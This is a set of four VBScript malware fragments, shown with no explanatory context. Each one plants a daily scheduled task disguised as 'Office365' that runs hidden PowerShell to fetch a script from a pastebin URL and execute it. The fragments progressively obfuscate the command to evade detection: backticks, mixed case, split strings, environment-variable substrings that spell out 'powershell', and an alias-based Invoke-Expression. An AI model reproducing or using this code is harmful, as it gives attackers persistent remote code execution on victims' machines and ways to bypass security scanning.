...
Dim objShell
	...
	Connect="cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR ""pOwErsHelL -w hidDEn -nOpR  -coM 'I`eX (N`E`W`-obje`CT Net.Webclient).\\\""dowNloa`DST`RIng\\\""((\\\""https://pastebin.com/raw/88SGrHVh\\\""))"""	
...
Dim objShell
	...
	Connect="cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR ""pOwErsHelL -w HIdDEn -nOPr  -co 'i`Ex (N`E`W`-obje`CT Net.Webclient).\\\""dowNloa`DST`RIng\\\""((\\\""ht\\\""+\\\""tps://pastebin.com/raw/88SGrHVh\\\""))"""	
	WshShell.Run Connect, 0, true
Set objShell = Nothing
...
Dim objShell
	Set WshShell = CreateObject("WScript.Shell")
	Connect="cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR ""%APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l -w HidDEn -nOPr  -co 'i`Ex (N`E`W`-obje`CT Net.Webclient).\\\""dowNloa`DST`RIng\\\""((\\\""ht\\\""+\\\""tps://pastebin.com/raw/88SGrHVh\\\""))"""	
	WshShell.Run Connect, 0, true
Set objShell = Nothing	
...
Dim objShell
	Set WshShell = CreateObject("W"+"S"+"cr"+"ip"+"t."+"Sh"+"e"+"l"+"l")
	Connect="cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR ""%APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l -w HidDEn -nOPr  -co &(GAL IE*)((N`E`W`-obje`CT Net.Webclient).\\\""dowNloa`DST`RIng\\\""((\\\""ht\\\""+\\\""tps://pastebin.com/raw/88SGrHVh\\\"")))"""	
	WshShell.Run Connect, 0, true
Set objShell = Nothing
